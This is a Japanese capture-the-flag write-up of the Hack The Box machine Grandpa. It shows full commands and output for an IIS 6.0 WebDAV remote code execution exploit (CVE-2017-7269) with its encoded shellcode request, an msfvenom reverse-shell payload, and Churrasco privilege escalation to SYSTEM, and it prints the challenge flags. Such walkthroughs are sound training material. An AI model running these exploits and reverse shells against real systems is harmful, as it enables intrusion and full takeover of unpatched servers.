https://app.hackthebox.com/machines/Grandpa

## STEP 1
```sh
└─$ rustscan -a 10.129.95.233 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.233:80
10.129.95.233 -> [80]
```

## STEP 2
80番にアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Grandpa_01.png">  
OPTIONSヘッダを確認すると、iis6.0かつwebdavで動作しているっぽい
```SH
└─$ curl -X OPTIONS -I http://10.129.95.233   
HTTP/1.1 200 OK
Date: Sun, 10 Aug 2025 14:01:08 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
MS-Author-Via: MS-FP/4.0,DAV
Content-Length: 0
Accept-Ranges: none
DASL: <DAV:sql>
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Cache-Control: private
```
iis6.0 webdav には、cve-2017-7269 がありrceの脆弱性がある  
[PoC](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/)をダウンロード、実行
```sh
└─$ wget -nv https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell
2025-07-19 13:09:20 URL:https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell [12313/12313] -> "iis6 reverse shell" [1]
                                                                                                                                                                                                                                      
└─$ python2.7 iis6\ reverse\ shell 10.129.95.233 80 10.10.16.7 4444
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```
リバースシェル取得！しかしユーザフラグすらとれず
```cmd
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.95.233] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>type C:\"Documents and Settings"\Harry\user.txt
type C:\"Documents and Settings"\Harry\user.txt
Access is denied.
```


## STEP 3
hotfixは１つのみ
```cmd
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 16 Hours, 25 Minutes, 16 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 25 Model 1 Stepping 1 AuthenticAMD ~2594 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 760 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,304 MB
Page File: In Use:         166 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```
侵害したアカウントは、NetworkService  
というこどで今回は[CVE-2009-0079](https://learn.microsoft.com/ja-jp/security-updates/securitybulletins/2009/ms09-012#windows-rpcss-service-isolation-vulnerability---cve-2009-0079)で権限昇格を試行
```cmd
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```
PoCの[churrasco.exe](https://github.com/Re4son/Churrasco)をダウンロード  
msfvenomでリバースシェルペイロード作成  
churrasco.exe と shell.exe をsmbserverにアップロード
```sh
└─$ wget -nv https://github.com/Re4son/Churrasco/raw/refs/heads/master/churrasco.exe 
2025-07-19 13:53:16 URL:https://raw.githubusercontent.com/Re4son/Churrasco/refs/heads/master/churrasco.exe [31232/31232] -> "churrasco.exe" [1]

└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.23 LPORT=5555 -f exe -o shell.exe                   
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe

└─$ impacket-smbserver share .
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
wrrite権限がある、C:\ADFS に移動  
shell.exe、churrasco.exe を配送
```cmd
c:\windows\system32\inetsrv>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                       Type             SID                                            Attributes                                        
================================ ================ ============================================== ==================================================
NT AUTHORITY\NETWORK SERVICE     User             S-1-5-20                                       Mandatory group, Enabled by default, Enabled group
Everyone                         Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
GRANPA\IIS_WPG                   Alias            S-1-5-21-1709780765-3897210020-3926566182-1005 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users    Alias            S-1-5-32-559                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE             Well-known group S-1-5-6                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization   Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                            Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group

c:\windows\system32\inetsrv>dir C:\
dir C:\
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\

04/12/2017  05:27 PM    <DIR>          ADFS
04/12/2017  05:04 PM                 0 AUTOEXEC.BAT
04/12/2017  05:04 PM                 0 CONFIG.SYS
04/12/2017  05:32 PM    <DIR>          Documents and Settings
04/12/2017  05:17 PM    <DIR>          FPSE_search
04/12/2017  05:17 PM    <DIR>          Inetpub
12/24/2017  08:18 PM    <DIR>          Program Files
09/16/2021  12:52 PM    <DIR>          WINDOWS
04/12/2017  05:05 PM    <DIR>          wmpub
               2 File(s)              0 bytes
               7 Dir(s)   1,373,024,256 bytes free

c:\windows\system32\inetsrv>icacls ADFS
icacls ADFS
Successfully processed 0 files; Failed processing 1 files
The system cannot find the file specified.

c:\windows\system32\inetsrv>icacls C:\ADFS
icacls C:\ADFS
C:\ADFS BUILTIN\Administrators:(F)
        BUILTIN\Administrators:(I)(OI)(CI)(F)
        NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
        CREATOR OWNER:(I)(OI)(CI)(IO)(F)
        BUILTIN\Users:(I)(OI)(CI)(RX)
        BUILTIN\Users:(I)(CI)(AD)
        BUILTIN\Users:(I)(CI)(WD)

Successfully processed 1 files; Failed processing 0 files

c:\windows\system32\inetsrv>cd C:\ADFS
cd C:\ADFS

C:\ADFS>copy \\10.10.16.23\share\churrasco.exe .
copy \\10.10.16.23\share\churrasco.exe .
        1 file(s) copied.

C:\ADFS>copy \\10.10.16.23\share\shell.exe .
copy \\10.10.16.23\share\shell.exe .
        1 file(s) copied.
```
エクスプロイト！
```cmd
C:\ADFS>churrasco.exe
churrasco.exe
/churrasco/-->Usage: Churrasco.exe [-d] "command to run"
C:\WINDOWS\TEMP

C:\ADFS>churrasco.exe -d C:\ADFS\shell.exe
churrasco.exe -d C:\ADFS\shell.exe
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```
権限昇格成功！ユーザ・ルートフラグゲット
```sh
└─$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.95.233] 1041
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system

C:\WINDOWS\TEMP>type C:\"Documents and Settings"\Harry\Desktop\user.txt
type C:\"Documents and Settings"\Harry\Desktop\user.txt
bdff5ec67c3cff017f2bedc146a5d869

C:\WINDOWS\TEMP>type C:\"Documents and Settings"\Administrator\Desktop\root.txt
type C:\"Documents and Settings"\Administrator\Desktop\root.txt
9359e905a2c35f861f6a57cecf28bb7b
```
